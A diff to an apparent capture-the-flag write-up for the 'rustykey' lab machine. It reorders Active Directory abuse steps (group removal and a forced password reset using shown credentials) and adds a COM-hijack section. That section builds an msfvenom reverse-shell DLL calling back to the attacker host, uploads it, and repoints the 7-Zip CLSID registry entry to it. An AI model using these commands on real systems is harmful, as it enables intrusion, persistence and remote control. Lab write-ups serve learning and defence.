@@ -578,18 +578,18 @@ And `HELPDESK` can ForceChangePAssword on `ee.reed`:
 
 ![](https://github.com/user-attachments/assets/22612c40-bece-4446-9b45-f6e0a9fd0ab2)
 
-Remove `SUPPORT` group from `PROTECTED OBJECTS` group:
-
-```console
-root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' SUPPORT
-[-] SUPPORT removed from PROTECTED OBJECTS
-```
-
 Reset password for `ee.reed`:
 
 ```console
 root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed Pass1234
 [+] Password changed successfully!
+```
+
+Remove `SUPPORT` group from `PROTECTED OBJECTS` group:
+
+```console
+root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' SUPPORT
+[-] SUPPORT removed from PROTECTED OBJECTS
 ```
 
 Get TGT for `ee.reed`:
@@ -671,6 +671,8 @@ Execute:
 Reverse shell hooked as `ee.reed`:
 
 ```cmd
+root@kali:~# rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.10.11.75] 53121
 Microsoft Windows [Version 10.0.17763.7434]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -678,6 +680,100 @@ Microsoft Windows [Version 10.0.17763.7434]
 C:\Windows\system32>whoami
 whoami
 rustykey\ee.reed
+```
+
+## 5. Lateral movement to `mm.turner`
+
+### 5.1. Component Object Model (COM) hijack
+
+Recall from `internal.pdf` about registry and some compression/decompression related functions
+
+Windows applications often call COM components through CLSIDs (Class IDs), and the system will load the corresponding DLL or EXE according to the configuration in the registry
+
+Let's see if we can tamper with the registry entries of existing COM components​​ to point to malicious DLLs
+
+Since the registry is related to compression, let's first check the possible CLSIDs:
+
+```cmd
+C:\Windows\system32>reg query HKCR\CLSID /s /f zip
+reg query HKCR\CLSID /s /f zip
+
+HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
+    (Default)    REG_SZ    7-Zip Shell Extension
+
+HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
+    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
+
+HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
+    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
+    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226
+
+HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
+    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu
+
+HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
+    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler
+
+HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
+    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler
+
+HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+End of search: 14 match(es) found.
+```
+
+7-Zip should be a viable vector, generate reverse shell payload DLL
+
+```console
+root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4445 -f dll -o reverse.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: reverse.dll
+```
+
+Use `evil-winrm`'s upload function on `bb.morgan`'s session to upload the DLL:
+
+```cmd
+*Evil-WinRM* PS C:\Users\bb.morgan> upload reverse.dll
+
+Info: Uploading /root/reverse.dll to C:\Users\bb.morgan\reverse.dll
+
+Data: 12288 bytes of 12288 bytes copied
+
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\bb.morgan> MOVE reverse.dll C:\ProgramData\
+```
+
+Start a listener on Kali: `rlwrap nc -nlvp 4445`
+
+Back to `ee.reed`'s session to edit registry:
+
+```cmd
+C:\Windows\system32>reg add HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32 /ve /d C:\ProgramData\reverse.dll /f
+reg add HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32 /ve /d C:\ProgramData\reverse.dll /f
+The operation completed successfully.
 ```
 
 ## work-in-progress
